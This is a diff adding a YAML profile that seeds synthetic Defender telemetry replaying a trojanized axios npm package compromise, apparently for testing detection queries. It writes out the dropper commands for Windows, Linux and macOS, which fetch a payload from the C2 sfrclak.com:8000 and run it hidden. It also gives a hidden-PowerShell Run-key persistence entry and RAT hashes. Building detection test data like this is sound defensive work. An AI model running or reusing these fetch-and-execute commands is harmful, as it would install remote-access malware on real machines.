@@ -1,0 +1,218 @@
+# Axios npm supply-chain compromise threat profile — replays the post-install
+# dropper command lines flagged by Microsoft's analysis of trojanized
+# axios@1.14.1 / axios@0.30.4 (via the planted plain-crypto-js@4.2.1 dep).
+#
+# Source: https://www.microsoft.com/en-us/security/blog/2026/04/01/mitigating-the-axios-npm-supply-chain-compromise/
+# See README.md in this directory for the detection KQL, coverage notes, and
+# limitations imposed by what xdrgen can seed via profile alone.
+
+tables:
+  - DeviceProcessEvents
+  - DeviceNetworkEvents
+  - DeviceRegistryEvents
+
+overrides:
+  tenant_id: 11112222-3333-4444-5555-666677778888
+  tenant_domain: northstar-labs.dev
+  on_prem_ad_domain: northstar.local
+  on_prem_netbios_domain: NORTHSTAR
+  on_prem_sid_prefix: S-1-5-21-3221984611-2843116597-1129441732
+
+  # The compromised developer — npm-installed the trojanized axios.
+  users:
+    - display_name: Devon Marsh
+      upn: devon.marsh@northstar-labs.dev
+      object_id: 7c1d4e9a-2b6f-4983-91a0-5d3f4e5b6c7d
+      type: Regular
+      sam_account_name: devon.marsh
+      sid_rid: 1421
+      given_name: Devon
+      surname: Marsh
+      department: Engineering
+      job_title: Full-stack Engineer
+      city: Berlin
+      country: DE
+
+  # Three dev workstations — one per platform that the article covers
+  # (Windows / Linux / macOS). The cmd.exe / sh entries below get picked
+  # uniformly per event, so all three branches of the Defender DPE detection
+  # have a path to fire.
+  devices:
+    - device_id: a1b2c3d4-e5f6-4708-8192-a3b4c5d6e7f8
+      device_name: WIN-DEVON-01.northstar.local
+      os_platform: Windows11
+      os_version: 10.0.22631.3737
+      public_ip: 91.214.62.18
+      local_ip: 10.20.30.41
+      mac_address: 00-15-5D-04-12-7A
+      machine_group: Engineering Workstations
+      primary_user_upn: devon.marsh@northstar-labs.dev
+    - device_id: b2c3d4e5-f607-4819-92a3-b4c5d6e7f809
+      device_name: lin-devon-02.northstar.local
+      os_platform: Linux
+      os_version: Ubuntu 22.04.4 LTS
+      public_ip: 91.214.62.18
+      local_ip: 10.20.30.42
+      mac_address: 00-15-5D-99-22-04
+      machine_group: Engineering Workstations
+      primary_user_upn: devon.marsh@northstar-labs.dev
+    - device_id: c3d4e5f6-0718-4920-a3b4-c5d6e7f8091a
+      device_name: mac-devon-03.northstar.local
+      os_platform: macOS
+      os_version: "14.5"
+      public_ip: 91.214.62.18
+      local_ip: 10.20.30.43
+      mac_address: A4-83-E7-2D-9C-11
+      machine_group: Engineering Workstations
+      primary_user_upn: devon.marsh@northstar-labs.dev
+
+  # Pin RemoteIP to the published C2 — every DeviceNetworkEvents row will
+  # carry the IOC IP, so the Sentinel ASIM `DstIpAddr in (ioc_ip_addr)`
+  # queries match.
+  ips:
+    - ip: 142.11.206.73
+      city: Buffalo
+      state: New York
+      country: US
+      isp: Nexeon Technologies
+      category: ISP
+      latitude: "42.886447"
+      longitude: "-78.878368"
+
+  # Pin (RemoteUrl, RemotePort) to the published C2 so the Defender
+  # `DeviceNetworkEvents` query (RemoteUrl contains "sfrclak.com" AND
+  # RemotePort == "8000") fires on every row.
+  network_destinations:
+    - port: 8000
+      url: sfrclak.com
+
+  # Stage the Windows PowerShell RAT's persistence — every
+  # DeviceRegistryEvents row writes the `MicrosoftUpdate` Run-key value
+  # documented in the Microsoft article.
+  registry_targets:
+    - key: 'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
+      value_name: MicrosoftUpdate
+      value_data: 'powershell.exe -w hidden -ep bypass -File %TEMP%\6202033.ps1'
+      value_type: REG_SZ
+
+  # Replace the whole process catalogue with just the dropper variants
+  # described in the Microsoft writeup so every DeviceProcessEvents row
+  # carries one of the three platform-specific command lines.
+  #
+  # has_all() terms required by the Defender detection (`DeviceProcessEvents`
+  # KQL in README.md) are present verbatim in each command line.
+  processes:
+    # Windows branch — cmd.exe drops + executes the PowerShell stage.
+    # has_all: "curl -s -X POST -d", "packages.npm.org", "-w hidden -ep",
+    #         ".ps1", "& del", ":8000". FileName =~ "cmd.exe".
+    - file_name: cmd.exe
+      folder_path: 'C:\Windows\System32'
+      company: Microsoft Corporation
+      description: Windows Command Processor
+      internal_file_name: cmd
+      original_file_name: Cmd.Exe
+      product_name: 'Microsoft® Windows® Operating System'
+      product_version: 10.0.19041.3636
+      command_lines:
+        - 'cmd.exe /c curl -s -X POST -d "packages.npm.org/6202033" http://sfrclak.com:8000/6202033 -o %TEMP%\6202033.ps1 & powershell.exe -w hidden -ep bypass -File %TEMP%\6202033.ps1 & del %TEMP%\6202033.ps1'
+      integrity_level: Medium
+      elevation: Default
+      signature_status: Valid
+      signer_type: OsVendor
+      parent: node.exe
+
+    # Linux branch — sh -c drops + nohup-launches the Python loader.
+    # has_all: "curl", "-d packages.npm.org/", "nohup", ".py", ":8000/",
+    #         "> /dev/null 2>&1" AND contains "python".
+    - file_name: sh
+      folder_path: /bin
+      company: GNU
+      description: GNU Bourne Again SHell
+      internal_file_name: sh
+      original_file_name: sh
+      product_name: GNU coreutils
+      product_version: 5.2.21
+      command_lines:
+        - 'sh -c "curl -X POST -d packages.npm.org/6202033 http://sfrclak.com:8000/ -o /tmp/ld.py && nohup python3 /tmp/ld.py > /dev/null 2>&1 &"'
+      integrity_level: Medium
+      elevation: Default
+      signature_status: Valid
+      signer_type: OsVendor
+      parent: node
+
+    # macOS branch — sh -c drops + executes the com.apple.act.mond binary.
+    # has_all: "curl", "-d packages.npm.org/", "com.apple.act.mond",
+    #         "http://", ":8000/", "&> /dev/null".
+    - file_name: bash
+      folder_path: /bin
+      company: Apple Inc.
+      description: Bourne-Again Shell
+      internal_file_name: bash
+      original_file_name: bash
+      product_name: macOS
+      product_version: "14.5"
+      command_lines:
+        - 'bash -c "curl -X POST -d packages.npm.org/6202033 http://sfrclak.com:8000/ -o /Library/Caches/com.apple.act.mond &> /dev/null && chmod +x /Library/Caches/com.apple.act.mond && /Library/Caches/com.apple.act.mond &"'
+      integrity_level: Medium
+      elevation: Default
+      signature_status: Valid
+      signer_type: OsVendor
+      parent: node
+
+    # --- Follow-on RAT executions — surface the published SHA-256 IOCs ---
+
+    # Windows PS RAT loader — DeviceProcessEvents.SHA256 carries the
+    # published ed8560c1... so SHA-256 hunting matches.
+    - file_name: powershell.exe
+      folder_path: 'C:\Windows\System32\WindowsPowerShell\v1.0'
+      company: Microsoft Corporation
+      description: Windows PowerShell
+      internal_file_name: POWERSHELL
+      original_file_name: PowerShell.EXE.MUI
+      product_name: 'Microsoft® Windows® Operating System'
+      product_version: 10.0.19041.3636
+      command_lines:
+        - 'powershell.exe -w hidden -ep bypass -File %TEMP%\6202033.ps1'
+      integrity_level: Medium
+      elevation: Default
+      signature_status: Valid
+      signer_type: OsVendor
+      parent: cmd.exe
+      sha256: ed8560c1ac7ceb6983ba995124d5917dc1a00288912387a6389296637d5f815c
+
+    # Linux Python loader — DeviceProcessEvents.SHA256 carries fcb81618...
+    - file_name: python3
+      folder_path: /usr/bin
+      company: Python Software Foundation
+      description: Python interpreter
+      internal_file_name: python3
+      original_file_name: python3
+      product_name: Python
+      product_version: "3.10.12"
+      command_lines:
+        - 'python3 /tmp/ld.py'
+      integrity_level: Medium
+      elevation: Default
+      signature_status: Valid
+      signer_type: OsVendor
+      parent: sh
+      sha256: fcb81618bb15edfdedfb638b4c08a2af9cac9ecfa551af135a8402bf980375cf
+
+    # macOS native RAT binary — DeviceProcessEvents.SHA256 carries 92ff0877...
+    # The binary IS the executable here, so SHA-256 maps cleanly to FileName.
+    - file_name: com.apple.act.mond
+      folder_path: /Library/Caches
+      company: ""
+      description: ""
+      internal_file_name: com.apple.act.mond
+      original_file_name: com.apple.act.mond
+      product_name: ""
+      product_version: ""
+      command_lines:
+        - '/Library/Caches/com.apple.act.mond'
+      integrity_level: Medium
+      elevation: Default
+      signature_status: Unsigned
+      signer_type: Unknown
+      parent: bash
+      sha256: 92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a
